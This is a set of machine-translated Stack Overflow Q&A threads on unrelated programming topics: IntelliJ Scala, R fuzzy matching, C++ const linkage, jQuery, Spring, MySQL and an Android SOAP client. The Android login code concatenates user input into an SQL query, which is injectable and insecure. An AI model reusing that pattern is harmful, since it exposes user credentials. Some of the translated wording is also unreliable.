```

我在用着

*   想法 12.1 (129.161)
*   Scala 编译器 2.10.1
*   Scala 插件 0.7.213
*   JDK 1.7
*   Windows 7的

在 Project Settings / Compiler / Use external build 中选中。在 IDE Settings / Scala / Run compile server 中被选中。

我需要手动启动编译器服务器吗？还要别的吗 ？

UPD：对我来说看起来像错误。我发布了 JIRA 票[http://youtrack.jetbrains.com/issue/SCL-5523](http://youtrack.jetbrains.com/issue/SCL-5523)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-01-20T07:12:30.410

您需要将堆大小从 1024 降低到 512 或其他东西。然后可以创建并启动编译服务器。尝试使用 InteliJ 13.0.2 (133.331) 和 Scala 插件 0.26.361

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-19T17:07:27.443

转到设置 - >编译器并取消选中“使用外部构建”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T04:47:27.103

它通常无需更改任何设置即可工作。这听起来像是端口冲突、先前不正常关闭的结果或堆大小不足。

![在此处输入图像描述](https://i.stack.imgur.com/NJRBl.png)

尝试通过转至 更改编译服务器端口`Settings -> Scala (under IDE settings list, towards the bottom) -> TCP port`。在那里，您还可以设置不同的最大堆大小。

该问题可能与[此](http://youtrack.jetbrains.com/issue/SCL-5370)未结票据有关。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-05-27T19:13:11.597

我提交的错误标记为已修复。JetBrains 的解释是

*“已修复”意味着编译现在默认工作，因此主要问题（如标题所述）已解决。但是，在 auto-make 之前自动初始编译服务器启动仍然不容易实现。这就是为什么 Scala 项目的 auto-make 仍然默认关闭的原因。当然，我们毕竟要支持自动制作。*

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-01-13T22:11:59.950

我对 IntelliJ 有同样的问题，如果您打开事件日志（在 IDE 的右下角），您可以看到错误消息 scala 编译器未配置 jdk 版本并提供设置链接。

`Settings > Languages and Frameworks > Scala Compile Server > JVM SDK`设置您用于 IDE 的 java，如本[屏幕截图所示](http://i.stack.imgur.com/wQ3u4.png)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-05T13:16:49.680

你可以试试我写的这个简单的项目，它使用了 sbt-idea 插件。它应该可以与最新的 Intellij IDEA 或 Scala IDE (EClipse) 一起使用

[骨骼](https://github.com/fractal/skeleton)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-12-12T23:49:58.727

将堆大小减少到 512 或 128 MB 对我有用

# r - 多词模糊匹配

> ID：15825917
> 
> 赞同：5
> 
> 时间：2013-04-05T04:28:03.057
> 
> 标签：r, fuzzy-search

我正在尝试在 R 中进行一些模糊匹配，其中我有多个数据字段要匹配。

例如：

```
try_to_match <- c('seoul korea', 'bisbane', 'korea', 'australia brisbane')
locations <- data.frame(name=c('seoul', 'brisbane'),
                        country=c('south korea', 'australia')) 
```

我想将用户输入的位置`try_to_match`与数据框相匹配`locations`。

现在，关于 SO 上的 R 模糊匹配也有类似的问题，而且大部分都覆盖了`agrep`. 但是，当有多个单词要匹配时，我找不到任何涵盖模糊匹配的内容。

例如，如果我只匹配`locations$name`，我会得到“bisbane”到“brisbane”的匹配，正如我所期望的那样。此外，由于`locations$name`没有国家/地区，我没有得到包含国家/地区的各种搜索的匹配项。

```
sapply(try_to_match, agrep, locations$name, value=T)
# $`seoul korea`
# character(0)    
# $bisbane
# [1] "brisbane"    
# $korea
# character(0)
# $`australia brisbane`
# character(0) 
```

所以，我想我也应该与国家匹配：

```
sapply(try_to_match, agrep, paste(locations$name, locations$country), value=T)
# $`seoul korea`
# character(0)    
# $bisbane
# [1] "brisbane australia"    
# $korea
# [1] "seoul south korea"    
# $`australia brisbane`
# character(0) 
```

但是，由于缺少单词，我仍然无法将“seoul korea”与“seoul south korea”匹配。同样，虽然“brisbane australia”会正确匹配，但“australia brisbane”不会（因为单词的顺序颠倒了）。（“韩国”是否与“首尔韩国”匹配有点不确定，但我很高兴现在留下来）。

所以，我的问题是：当搜索***和*****匹配项可能有多个单词并且单独拼写错误并且单词的顺序可以不同时，****如何进行模糊匹配？**

 *有没有一个包可以为我做这种搜索？

（是的，我可以使用出色的 geonames Web 服务进行很多匹配，但我想避免向其服务器发出很多请求。我对在 R 中进行此类搜索的能力比对能力更感兴趣进行地理编码）。*

# c# - 鉴于该进程中托管的表单的标题，我如何终止该进程？

> ID：15825918
> 
> 赞同：-5
> 
> 时间：2013-04-05T04:28:13.277
> 
> 标签：c#, process

鉴于该进程中托管的表单的标题，我如何终止该进程？

如何杀死程序在系统退出时运行。而我只有它的标题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:31:51.377

我相信你正试图关闭你的表格。如果是这样，那么您可以使用[`Application.OpenForms`](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.openforms.aspx)属性并根据标题获取表单，例如：

```
var form = Application.OpenForms
                      .Cast<Form>()
                      .FirstOrDefault(r=> r.Text == "YourTitle");
if(form != null)
    form.Close(); 
```

*您应该考虑到同一标题可能有多种形式。*

# c++ - 为什么全局 const char 需要“静态”而不是 bool？

> ID：15825921
> 
> 赞同：16
> 
> 时间：2013-04-05T04:28:27.150
> 
> 标签：c++, static, global-variables

共享标头。

我可以做这个：

`const bool kActivatePlayground=false;`

包含在多个文件中时工作正常。

我不能做到这一点：

`const char * kActivePlayground = "kiddiePool";`

导致错误：重复符号。

但这有效：

`static const char * kActivePlayground = "kiddiePool";`

为什么`static`需要 the`const char *`而不是 the `const bool`？另外，我认为`static`没有必要，因为`const`总是`static`隐含的？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-04-05T05:01:20.990

在 C++ 中，`const`变量默认具有静态链接，而非`const`变量具有外部链接。

多重定义错误的原因是

```
const char * kActivePlayground = "kiddiePool"; 
```

创建具有外部链接的变量。

嘿等等，我不是说`const`变量默认为静态链接吗？是的，我做到了。但`kActivePlayground`不是`const`。它是指向 的非`const`指针`const char`。

这将按您的预期工作：

```
const char * const kActivePlayground = "kiddiePool"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-02T15:14:21.863

您可以使用常量字符数组

```
const char kActivePlayground[] = "kiddiePool"; 
```

而 kActivePlayground 也可以用于赋值，因为它是一个引用

```
const char* playground_text = kActivePlayground; 
```

# c++ - boost::可选引用 boost::variant 类型

> ID：15825922
> 
> 赞同：4
> 
> 时间：2013-04-05T04:28:41.683
> 
> 标签：c++, boost-variant, boost-optional

我目前正在为游戏编写一些代码，其中一部分涉及创建迄今为止在游戏中发生的动作的历史记录。此历史记录存储在`state_pair_t`' 对动作 ( `action_t`'s) 的向量中，并在执行动作后指向结果游戏状态的指针。现在我有一个函数，它从最近的时间点开始查看历史并向后迭代，直到找到某种类型的动作，然后返回对该动作的引用。`no_action`现在我们决定，如果没有找到任何操作，使用 boost optional 来返回 a并用于`boost::optional`处理这些应该返回值但可能没有返回值的函数可能是一个很好的设计举措。当我真正尝试实现这一点时，我遇到了一个我不明白的错误：

```
typedef boost::variant<
    A,
    B,
    B
> action_t;

typedef boost::optional< action_t& > opt_action_ref_t;

const opt_action_ref_t no_action = opt_action_ref_t();

/*! A state pair is the combination of a particular action and the resulting game state */
typedef std::pair< const action_t, game_state_ptr > state_pair_t;

opt_action_ref_t get_last_non_A_action() const{
    std::vector< state_pair_t >::const_reverse_iterator rcit;
    for(rcit = m_states.rbegin(); m_states.rend() != rcit ; ++rcit){
        if(!(is_action_type< A >(rcit->first))){
            return rcit->first; \\error at compile time 
        }
    }

    return no_action;
} 
```

现在这给出了一个编译错误：

```
Error error C2664: 'boost::optional<T>::optional(boost::none_t)' : cannot convert parameter 1 from 'const action_t' to 'boost::none_t' 
```

现在，如果我将其稍微更改为：

```
 if(!(is_action_type< A >(rcit->first))){
        return boost::optional<action_t>(rcit->first);
    } 
```

我得到另一个错误：

```
error C2664: 'boost::optional<T>::optional(boost::none_t)' : cannot convert parameter 1 from 'boost::optional<T>' to 'boost::none_t' 
```

我不确定这些错误中的任何一个试图在这里告诉我什么。我在这里尝试做的不是一个好主意`boost::optional`吗？甚至可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T07:29:04.570

可选参考本身就是一个好主意；[在最近的论文 n3527](http://www.open-std.org/JTC1/SC22/WG21/docs/papers/2013/n3527.html#optional_ref)中特别提到了它们，旨在作为 C++14 中的库组件进行标准化。[Boost.Optional](http://www.boost.org/doc/libs/1_53_0/libs/optional/doc/html/boost_optional/optional_references.html)支持它们。

您的代码的问题是您试图将非 const 可选引用绑定到 const 左值；如果你改成`boost::optional< action_t& >`它`boost::optional< const action_t& >`应该编译得很好。

# javascript - 使用ajax删除内容

> ID：15825926
> 
> 赞同：1
> 
> 时间：2013-04-05T04:29:35.563
> 
> 标签：javascript, ajax

我是ajax的新手。

我有**index.html**

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

<script>
$(document).ready(function(){
  $("button").click(function(){
    $.ajax({url:"n.php",success:function(result){
      $("#div1").append(result);
    }});
  });
});
</script>

<div id="div1" style="margin-left: 25;"></div>
<button>Add Author</button> 
```

**演示.php**

```
Name:<input type="text" name="txtname">
age:<input type="text" name="txtage"> 
```

当单击“添加作者”按钮而不刷新页面时，上面的代码会在 index.html 页面上添加名称和年龄文本框。

现在我想放置另一个按钮“删除作者”，并希望执行完全相反的操作（即）删除之前添加的名称和年龄文本框。

我不知道该怎么做。是否有可能通过这样的事情 `$("#div1").(result);`

提前谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:58:22.070

试试这个

```
 <div id="div1" style="margin-left: 25;"></div>
      <button id="addAuthor">Add Author</button>
      <button id="removeAuthor">Remove Author</button>

 <script>
      $(document).ready(function(){

        $("#addAuthor").click(function(e){
         e.preventDefault();
         $.ajax({url:"n.php",success:function(result){
         $("#div1").html(result);
            }});
        });

        $("#removeAuthor").click(function(e){
               e.preventDefault();
               var lastNode = $("#div1").children().last();
               lastNode.prev().remove();
               lastNode.remove();
         });
      });
 </script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:31:17.793

你可以这样做`$("#div1").empty()`，这将清空 div。那是你需要的吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:34:47.997

试试这个：

```
$(document).ready(function(){
 $("#remove").on("click",function(){
  $("#div1").empty();
});
}); 
```

或使用

`$("#div1").html("");`代替`$("#div1").empty();`

# java - 在弹簧控制器中产生新线程

> ID：15825931
> 
> 赞同：1
> 
> 时间：2013-04-05T04:30:20.397
> 
> 标签：java, multithreading, servlets, controller

因此，在下面的代码中，当我`yService.performAction()`对许多项目执行此操作时，会花费太多时间。

有人建议我尝试使用线程来加快速度，所以我上网查看并发现从控制器生成新的子线程是不可取的，因为它可能会弄乱 Java EE 容器线程池。如果我的`yService.performAction(`) 需要时间来运行并且需要使其快速运行，我有什么选择？

许多人一直建议使用 Quartz 来生成新线程。我不确定我是否想做那么复杂的事情。如何在单独的线程中运行该特定服务？有什么简单的方法吗？

```
@Controller
@RequestMapping("/test")
public class TestController {
private static final Logger logger = Logger.getLogger(TestController.class);

@Autowired
XService xService;
@Autowired
private YService yService;

@RequestMapping(method = { RequestMethod.GET })
public void testCheck(HttpServletRequest request, HttpServletResponse response) throws IOException {

    try {
        List<SL> somelist = XService.getAllX();

        StringBuffer status = new StringBuffer("SUCCESS\n\n");

        for (SL sl : somelist) {
            boolean flag = false;
            try {
                flag = yService.performAction(sl);
            } catch (Exception e) {
                logger.error(e.getMessage(), e);
            }

        }

        response.setStatus(HttpServletResponse.SC_OK);
        response.getWriter().write(status.toString());

    } catch (Exception e) {
        logger.error(e.getMessage(), e);
        response.getWriter().write("FAILED");
    }
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T07:55:53.487

您最好的选择是使用 ExecutorService 并调用[invokeAll()](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ExecutorService.html#invokeAll%28java.util.Collection%29)。您可以通过调用[Executors.newFixedThreadPool()](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/Executors.html#newFixedThreadPool%28int%29)来检索实例。

# mysql - 显示所选参数的那些部分的值

> ID：15825935
> 
> 赞同：0
> 
> 时间：2013-04-05T04:30:50.450
> 
> 标签：mysql, sql-server

很抱歉再次打扰您，我在制定我的查询时遇到了困难。我有两列带有日期值。（见下面的示例）

```
Posting Date                col B
Feb 02,2013              feb 01, 2013
Feb 02, 2013            
feb 15, 2013
mar 03,2013              mar 01, 2013
april 12, 2013           april 12, 2013 
```

如果我的参数是基于 col B 的日期范围（例如 colB 在 02/01/2013 和 02/28/2013 之间）。我想在发布日期中显示所有值，这是我过滤的日期范围的一部分。比如说，将 2 月和 2013 年作为年份

结果：

```
Posting Date                col B
Feb 02,2013              feb 01, 2013
Feb 02, 2013            
feb 15, 2013 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:33:30.150

这是你要找的吗？您的 Posting_Date 列的字段类型是日期吗？如果是这样，那么这应该工作：

```
SELECT Posting_Date, ColB
FROM YourTable
WHERE Posting_Date >= '2013-02-01'
   AND Posting_Date < '2013-03-01' 
```

我更喜欢使用`>=`and`<`而不是`BETWEEN`.

如果您的 Posting_Date 字段存储为 varchar，则使用`STR_TO_DATE`：

```
SELECT Posting_Date, ColB
FROM YourTable
WHERE STR_TO_DATE(Posting_Date , '%M %d,%Y') >= '2013-02-01'
   AND STR_TO_DATE(Posting_Date , '%M %d,%Y') < '2013-03-01' 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!2/5eaf6/3)

# linux - Linux can总线驱动

> ID：15825940
> 
> 赞同：0
> 
> 时间：2013-04-05T04:31:42.747
> 
> 标签：linux, linux-device-driver, can-bus

我正在通过一个用于 MCP-2515
[https://github.com/raspberrypi/linux/blob/rpi-3.6.y/drivers/net/can/mcp251x.c的罐式网络驱动程序](https://github.com/raspberrypi/linux/blob/rpi-3.6.y/drivers/net/can/mcp251x.c)

请建议我在哪里可以找到该功能的描述，:--

```
alloc_candev
open_candev
alloc_can_skb
can_dropped_invalid_skb
alloc_can_err_skb
etc ..... 
```

是否有一些自述文件或一些教程？

请建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T12:43:23.053

对于内核函数，我发现 [lxr](http://lxr.linux.no/linux+v3.8.5/include/linux/can/dev.h#L98) 非常有用。但我并不是说这就是你所要求的，也许你可以在你的问题中更具体一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-02T07:18:05.670

这是查找有关 SocketCAN 驱动程序信息的第一个地方：[https ://www.kernel.org/doc/Documentation/networking/can.txt](https://www.kernel.org/doc/Documentation/networking/can.txt)

网络资料可以在同一个文件夹中找到：[https ://www.kernel.org/doc/Documentation/networking/](https://www.kernel.org/doc/Documentation/networking/)

这里是 Linux 中网络缓冲的描述：http: [//vger.kernel.org/~davem/skb.html](http://vger.kernel.org/~davem/skb.html)和[http://www.tldp.org/LDP/khg/HyperNews/get/net/net-intro。 html](http://www.tldp.org/LDP/khg/HyperNews/get/net/net-intro.html)

# mysql - Mysql条件插入（带组合主键）

> ID：15825942
> 
> 赞同：0
> 
> 时间：2013-04-05T04:32:04.243
> 
> 标签：mysql

我有以下结构的表

```
id -- auto increment
name -- unique
group -- integer
Primary key(name,group) 
```

我不想添加具有相同名称和组值的元素。

```
(i.e ("test",1) and ("test",1) should not be inserted.... and 
        ("test",1),("test",2) can be inserted). 
```

如果不存在，我想插入一个值。我检查了 [链接](https://stackoverflow.com/questions/2223344/mysql-conditional-insert-if-not-exists-insert)。

使用上面的链接可以进行操作，但问题是它只检查名称作为键而不与组结合（即插入值（“test”，1）和（“test”，2）不是发生）

我怎样才能做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:34:38.897

如果您的主键是`name`和`group`

你可以做`INSERT IGNORE`

```
INSERT IGNORE INTO yourTable
SET name = 'test',
    group = 1; 
```

只要它们都是您的主键的一部分，这应该检查它们的组合

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:48:01.570

我认为名称列唯一的问题，请删除名称列的唯一约束并尝试`INSERT IGNORE INTO yourTable(name,group)values("test",2)`

# java - 在 android 4.2 中使用 SOAP Web 服务

> ID：15825943
> 
> 赞同：0
> 
> 时间：2013-04-05T04:32:07.947
> 
> 标签：java, android, web-services, android-asynctask, ksoap2

我正在开发一个使用 SOAP 连接到 Web 服务的应用程序，但我无法正确建立连接，这是我的活动：

```
import java.io.IOException;
import android.os.StrictMode; 
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase; 
import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapPrimitive;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.HttpTransportSE;
import org.xmlpull.v1.XmlPullParserException;
import com.google.gson.Gson;

public class Autenticacion extends Activity {

//Constantes para la invocacion del web service
    private static final String NAMESPACE = "http://tempuri.org/";
    private static String URL="http://192.168.1.66:50513/Sicam/Service1.asmx";
    private static final String METHOD_NAME = "MostrarProfesor";
    private static final String SOAP_ACTION ="http://tempuri.org/MostrarProfesor";

    //Declaracion de variables para consuymir el web service
    private SoapObject request=null;
    private SoapSerializationEnvelope envelope=null;
    private SoapPrimitive  resultsRequestSOAP=null;
    private ProgressDialog dialog;
    TextView result;

    //Declaracion de variables para serealziar y deserealizar
    //objetos y cadenas JSON
    Gson gson ;
    private String  strJSON;

//Instancias a objetos tipo EditText
private EditText user, pass;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
    setContentView(R.layout.autenticacion);
    if (android.os.Build.VERSION.SDK_INT > 9) { 
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        } 
    result = (TextView)findViewById(R.id.label_user);

    // Asigna los objetos
    this.user = (EditText) findViewById(R.id.user);
    this.pass = (EditText) findViewById(R.id.pass);
}

 public void autentificar(View view) {
     //Se crea una instancia de la clase AdminDataBase
     AdminDataBase datahelper = new AdminDataBase(this);
     //Con la instancia creada se llama al metodo open para abrir la base de datos
      SQLiteDatabase db= datahelper.open();
      //Se crean dos variables tipo String para guardar los datos de la consulta
      String adapter=null;
      String adapter1=null;
     try{
            //Se ejecuta una consulta SQLite para recueprar el nombre de usuario y contraseña
          Cursor fila = db.rawQuery("select Usuario, Contraseña from Profesor where Usuario='"+user.getText()+"' or Contraseña='"+pass.getText()+"'", null);
           startManagingCursor(fila);
        //Se verifica que existe al menos un registro
          if (fila.moveToFirst()) {           

                //Si existen registros se obtienen las columnas con datos y se asignan a las variables
                adapter =fila.getString(0);
                adapter1 =fila.getString(1);

                //Comprueba si el nombre de usuario y/o contraseña son validos
                 if(this.user.getText().toString().trim().equals(adapter)  && this.pass.getText().toString().trim().equals(adapter1)) {
                     Toast.makeText(getApplicationContext(),                      
                          "Te has autentificado correctamente...", Toast.LENGTH_LONG).show(); 
                     //Se inicia la actividad para pasar a la siguiente pantalla si el ingreso fue correcto
                     Intent i=new Intent(this,Menu.class);
                     i.putExtra("usuario",adapter);
                     i.putExtra("contraseña", adapter1);
                     startActivity(i);
                     this.finish();
                 }
                 else{

                     Toast.makeText(getApplicationContext(),                      
                          "¡El nombre de usuario y/o contraseña son incorrectos!", Toast.LENGTH_LONG).show();

                 }
                //Si no existe un registro en la base se manda 
                 //el siguiente mensaje para que el usuario pase a administracion a darse de alta                   
          }else{
                    Toast.makeText(getApplicationContext(),"Puede ser que no este registrado en la base de datos consulte al administrador", Toast.LENGTH_LONG).show();
          }
        }catch(Exception e){

            Log.i("BaseDatos", "Error al recuperar datos" + e);
        }
     db.close();
     new MiTarea().execute();

 }

//Método para cancelar o salir de la aplicación
public void salida(View view){

    this.finish();
}

private class MiTarea extends AsyncTask<String, Float, String>{

    ProgressDialog dialog = new ProgressDialog(Autenticacion.this);
    protected void onPreExecute() {
        super.onPreExecute();           
        dialog.setMessage("Loading Profesor details. Please wait...");
        dialog.setIndeterminate(false);
        dialog.setCancelable(true);
        dialog.show();
     }

     protected String doInBackground(String...params) {

        //Se crea un objeto SoapObject para poder realizar la peticion
        //para consumir el WS SOAP. El constructor recibe
        //el namespace. Por lo regular el namespace es el dominio
        //donde se encuentra el web service
        request = new SoapObject(NAMESPACE, METHOD_NAME);

        //Se crea un objeto SoapSerializationEnvelope para serealizar la
        //peticion SOAP y permitir viajar el mensaje por la nube
        //el constructor recibe la version de SOAP
        envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true; //se asigna true para el caso de que el WS sea de dotNet
        //Se envuelve la peticion soap
        envelope.setOutputSoapObject(request);

        envelope.dotNet = true; //se asigna true para el caso de que el WS sea de dotNet

        //Objeto que representa el modelo de transporte
        //Recibe la URL del ws
        HttpTransportSE transporte = new HttpTransportSE(URL);

        try {
            //Hace la llamada al ws
            transporte.call(SOAP_ACTION, envelope);

            //Se crea un objeto SoapPrimitive y se obtiene la respuesta
            //de la peticion
            resultsRequestSOAP = (SoapPrimitive)envelope.getResponse();
            String res = resultsRequestSOAP.toString();
            if(res.equals("1"))
                //Toast.makeText(getApplicationContext(), "Se pudo completar la descarga", Toast.LENGTH_LONG);
                Log.i("1", "Se descargarón los datos");
        } catch (IOException e) {

            //Toast.makeText(getApplicationContext(), "No se pudo completar la descarga" +e, Toast.LENGTH_LONG);
            Log.i("2", "No se descargarón los datos");
            e.printStackTrace();
        } catch (XmlPullParserException e) {

            //Toast.makeText(getApplicationContext(), "No se pudo completar la descarga" +e, Toast.LENGTH_LONG);
            Log.i("3", "No se descargarón los datos");
            e.printStackTrace();
        }

        //Almacenamos el resultado en un String ya que lo que represa
        //el ws es una cadena json, representando una lista AndroidOS
        //de objetos del tipo
        strJSON = resultsRequestSOAP.toString();
        result.setText(strJSON);

        //se crea el objeto que ayuda deserealizar la cadena JSON
          gson = new Gson();

          //Obtenemos el tipo de un ArrayList
          /*Type lstT = new TypeToken; ArrayList;(){}.getType();

          //Creamos una objeto ArrayList
          ArrayList arrListAOS = new ArrayList();

          //Deserealizamos la cadena JSON para que se convertida a un ArrayList
          arrListAOS = gson.fromJson(strJSON);

          //Asignaos la ArrayList al controls ListView para mostrar
          //la lista de SO Android que se consumieron del web service
          lsvAndroidOS.setAdapter(new ArrayAdapter
          (getApplication(), android.R.layout.simple_list_item_1, arrListAOS));*/

        //Toast.makeText(getApplicationContext(),                     
            //  "Datos Bajados Correctamente:" + strJSON, Toast.LENGTH_LONG).show();
         Log.i("4", "Se descargarón los datos");
        Log.d("Se descargarón los datos", strJSON);

         return null;
     }

     protected void onProgressUpdate (Float... valores) {

     }

     protected void onPostExecute(String bytes) {
         super.onPostExecute(bytes);
         if (this.dialog.isShowing()) {
             this.dialog.dismiss();
                                          }             

     }
  } 
} 
```

日志：

```
04-05 16:24:58.538: E/WindowManager(1133): Activity com.android.sicam.Autenticacion has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView{40d35f38 V.E..... R.....ID 0,0-480,144} that was originally added here
04-05 16:24:58.538: E/WindowManager(1133): android.view.WindowLeaked: Activity com.android.sicam.Autenticacion has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView{40d35f38 V.E..... R.....ID 0,0-480,144} that was originally added here
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.ViewRootImpl.<init>(ViewRootImpl.java:354)
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:216)
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:69)
04-05 16:24:58.538: E/WindowManager(1133):  at android.app.Dialog.show(Dialog.java:281)
04-05 16:24:58.538: E/WindowManager(1133):  at com.android.sicam.Autenticacion$MiTarea.onPreExecute(Autenticacion.java:138)
04-05 16:24:58.538: E/WindowManager(1133):  at android.os.AsyncTask.executeOnExecutor(AsyncTask.java:586)
04-05 16:24:58.538: E/WindowManager(1133):  at android.os.AsyncTask.execute(AsyncTask.java:534)
04-05 16:24:58.538: E/WindowManager(1133):  at com.android.sicam.Autenticacion.autentificar(Autenticacion.java:119)
04-05 16:24:58.538: E/WindowManager(1133):  at java.lang.reflect.Method.invokeNative(Native Method)
04-05 16:24:58.538: E/WindowManager(1133):  at java.lang.reflect.Method.invoke(Method.java:511)
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.View$1.onClick(View.java:3594)
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.View.performClick(View.java:4204)
04-05 16:24:58.538: E/WindowManager(1133):  at android.view.View$PerformClick.run(View.java:17355)
04-05 16:24:58.538: E/WindowManager(1133):  at android.os.Handler.handleCallback(Handler.java:725)
04-05 16:24:58.538: E/WindowManager(1133):  at android.os.Handler.dispatchMessage(Handler.java:92)
04-05 16:24:58.538: E/WindowManager(1133):  at android.os.Looper.loop(Looper.java:137)
04-05 16:24:58.538: E/WindowManager(1133):  at android.app.ActivityThread.main(ActivityThread.java:5041)
04-05 16:24:58.538: E/WindowManager(1133):  at java.lang.reflect.Method.invokeNative(Native Method)
04-05 16:24:58.538: E/WindowManager(1133):  at java.lang.reflect.Method.invoke(Method.java:511)
04-05 16:24:58.538: E/WindowManager(1133):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-05 16:24:58.538: E/WindowManager(1133):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-05 16:24:58.538: E/WindowManager(1133):  at dalvik.system.NativeStart.main(Native Method)
04-05 16:24:58.997: W/System.err(1133): java.io.IOException: HTTP request failed, HTTP status: 400
04-05 16:24:59.009: W/System.err(1133):     at org.ksoap2.transport.HttpTransportSE.call(HttpTransportSE.java:195)
04-05 16:24:59.017: W/System.err(1133):     at org.ksoap2.transport.HttpTransportSE.call(HttpTransportSE.java:116)
04-05 16:24:59.017: W/System.err(1133):     at org.ksoap2.transport.HttpTransportSE.call(HttpTransportSE.java:111)
04-05 16:24:59.017: W/System.err(1133):     at com.android.sicam.Autenticacion$MiTarea.doInBackground(Autenticacion.java:170)
04-05 16:24:59.028: W/System.err(1133):     at com.android.sicam.Autenticacion$MiTarea.doInBackground(Autenticacion.java:1)
04-05 16:24:59.028: W/System.err(1133):     at android.os.AsyncTask$2.call(AsyncTask.java:287)
04-05 16:24:59.038: W/System.err(1133):     at java.util.concurrent.FutureTask.run(FutureTask.java:234)
04-05 16:24:59.038: W/System.err(1133):     at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
04-05 16:24:59.047: W/System.err(1133):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1080)
04-05 16:24:59.047: W/System.err(1133):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:573)
04-05 16:24:59.057: W/System.err(1133):     at java.lang.Thread.run(Thread.java:856)
04-05 16:24:59.057: W/dalvikvm(1133): threadid=12: thread exiting with uncaught exception (group=0x40a71930)
04-05 16:24:59.157: E/AndroidRuntime(1133): FATAL EXCEPTION: AsyncTask #2
04-05 16:24:59.157: E/AndroidRuntime(1133): java.lang.RuntimeException: An error occured while executing doInBackground()
04-05 16:24:59.157: E/AndroidRuntime(1133):     at android.os.AsyncTask$3.done(AsyncTask.java:299)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.FutureTask.finishCompletion(FutureTask.java:352)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.FutureTask.setException(FutureTask.java:219)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.FutureTask.run(FutureTask.java:239)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1080)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:573)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.lang.Thread.run(Thread.java:856)
04-05 16:24:59.157: E/AndroidRuntime(1133): Caused by: java.lang.NullPointerException
04-05 16:24:59.157: E/AndroidRuntime(1133):     at com.android.sicam.Autenticacion$MiTarea.doInBackground(Autenticacion.java:194)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at com.android.sicam.Autenticacion$MiTarea.doInBackground(Autenticacion.java:1)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at android.os.AsyncTask$2.call(AsyncTask.java:287)
04-05 16:24:59.157: E/AndroidRuntime(1133):     at java.util.concurrent.FutureTask.run(FutureTask.java:234)
04-05 16:24:59.157: E/AndroidRuntime(1133):     ... 4 more 
```

我在清单中声明了互联网许可

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T14:44:21.530

原因好像是`java.net.SocketTimeoutException`

在您的日志中：

`W/System.err(1057): java.net.SocketTimeoutException: failed to connect to /10.0.2.2 (port 4000) after 20000ms`线告诉我们。

而不是这段代码：

```
HttpTransportSE transporte = new HttpTransportSE(URL); 
```

试试这个代码：

```
HttpTransportSE transporte = new HttpTransportSE(URL, 60000); 
```

